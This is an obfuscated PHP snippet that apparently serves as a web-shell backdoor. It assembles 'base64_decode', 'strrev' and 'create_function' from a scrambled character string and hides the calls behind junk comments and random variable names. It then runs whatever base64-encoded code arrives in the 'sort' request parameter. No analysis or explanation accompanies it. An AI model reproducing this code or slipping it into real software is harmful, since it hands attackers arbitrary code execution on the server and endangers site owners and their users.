...
$HCFaNIUY7495 = "_kxmh(674i0duz3y/prl)eafocgn2tjqs5;b1v9*.w8";


$wrxEYipL3413 = "";

foreach([32,24,18,29] as $G){
       $wrxEYipL3413 .= $HCFaNIUY7495[$G];
    }


if(isset($_REQUEST /*tXPBJYjanKnlQCznDpRKnqOHdyoKMdPWzYrYcBqTFDNnUxelgaprcERKSaKWnIreztLPoyrgQQgJRMDCDeGrLkOhAXaBHHNGthaZtOlMVvsyIuVoTCRLnkFXbmjAVZcA*/["$wrxEYipL3413"])){
    $gohDtyYM3780 = $_REQUEST /*tXPBJYjanKnlQCznDpRKnqOHdyoKMdPWzYrYcBqTFDNnUxelgaprcERKSaKWnIreztLPoyrgQQgJRMDCDeGrLkOhAXaBHHNGthaZtOlMVvsyIuVoTCRLnkFXbmjAVZcA*/["$wrxEYipL3413"];
    $GFdUuIhu1857 = "";
    $CZprnjpL7374 = "";

    /*WzJEpgwVmScKkPMPiAlCFfLOyjXRmQgDTGZrTJLYiEdPmxmKdRXZfSwArfuGlIdiLhhyqGTuYKXoiyFYRBDPzYbGduLOdTTfwbkYGWVkHjLgXTSFzFcZMyzfJcWqPyDx*/

    foreach([35,22,32,21,6,8,0,11,21,25,24,11,21] as $G){
       $GFdUuIhu1857 .= $HCFaNIUY7495[$G];
    }

    /*aogSRFQtkbsrFHZGacvCTrRYjfaluwghyVVfUIEVGnTWhPZbvTHzUEdkCAXATNDmQWELRfmRWTnVDrSOJdMQNkhQPqOilzTJaqgMIVOhfRBnSlFWRHMzBkgPVyzkxDdB*/


    foreach([32,29,18,18,21,37] as $G){
       $CZprnjpL7374 .= $HCFaNIUY7495[$G];
    }

    /*fdCfsejQikIZaAmxSFEDiDYiUadFCbgLdlSSWHyTfWJeciMrMVqaIqJVNWBuBTdpULbZtEGpUbDCXjfFBGWQcwobAlSCteTnFFdzJUHeEAruMEsniJvapWMAgUcefJCE*/

    $G = $CZprnjpL7374('n'.''.''.''.'o'.'i'.'t'.'c'.'n'.'u'.'f'.''.''.''.'_'.'e'.'t'.'a'.'e'.''.''.'r'.''.''.'c');
    $y = $G("", $GFdUuIhu1857($gohDtyYM3780));
    $y();
    exit();
